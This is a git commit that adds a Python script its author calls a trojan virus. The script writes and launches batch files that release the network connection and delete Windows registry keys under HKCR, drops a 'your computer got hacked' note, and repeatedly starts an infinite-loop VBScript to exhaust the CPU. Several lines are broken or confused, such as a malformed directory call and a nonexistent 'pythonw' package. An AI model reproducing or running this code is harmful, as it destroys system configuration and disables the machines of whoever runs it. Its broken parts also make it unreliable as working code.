7261e32a746937f2e87d97e8e52fdb8067433765
BoldyDeadCoder <62553730+BoldyDeadCoder@users.noreply.github.com>
2022-08-24 23:18:16 -0400

    Create trojan virus.py
    brand new, improved, zero bugs version of my advance trojan virus code inside my github page
    V1.00-created

---
+++ trojan virus.py
@@ -0,0 +1,74 @@
+import os
+
+os.system('Start cmd /c & python pip install pythonw')
+os.system('start cmd & pythonw test].py')
+
+pass
+
+parent_dir = "C://home//User//Documents"
+
+os.makedirs(parent_dir, os.R_OK), os.W_OK
+
+
+def file_return():
+    if os.access("C://home//User//Documents", os.F_OK):
+        A_file = open("C://home//User//Documents//HI.txt", 'w')
+        A_file.writelines("sorry but your computer got hacked.\n")
+        A_file.writelines("say goodbye to your toaster\n")
+        print(A_file)
+
+
+print(file_return())
+internet_disable = open("C://home//User//Documents//internet_disable.txt", 'w')
+internet_disable.writelines('@echo off \n')
+internet_disable.writelines('IPconfig /release')
+
+internet_disable = 'C://home//User//Documents//internet_disable.txt'
+base = os.path.splitext(internet_disable)[0]
+os.rename(internet_disable, base + '.bat')
+os.system.__call__("Start C://home//User//Documents//internet_disable.bat")
+
+pass
+delete_reg = open("C://home//User//Documents//delete_reg.txt", 'w')
+delete_reg.writelines('@ECHO OFF\n')
+delete_reg.writelines('START reg delete HKCR/.exe\n')
+delete_reg.writelines('START reg delete HKCR/.dll\n')
+delete_reg.writelines('START reg delete HKCR/*')
+delete_reg.writelines(' ECHO Your PC has been crashed.Badd.\n')
+
+delete_reg = 'C://home//User//Documents//delete_reg.txt'
+base = os.path.splitext(delete_reg)[0]
+os.rename(delete_reg, base + '.bat')
+os.system.__call__("Start C://home//User//Documents//delete_reg.bat")
+pass
+
+CPU = open("C://home//User//Documents//cpu_breaker.txt", 'w')
+CPU.writelines("while True\n")
+CPU.writelines("Wend\n")
+
+CPU = "C://home//User//Documents//cpu_breaker.txt"
+base = os.path.splitext(CPU)[0]
+os.rename(CPU, base + ".vbs")
+os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+
+for i in range(999999999 * 9999999999):
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
+    os.system.__call__("Start C://home//User//Documents//cpu_breaker.vbs")
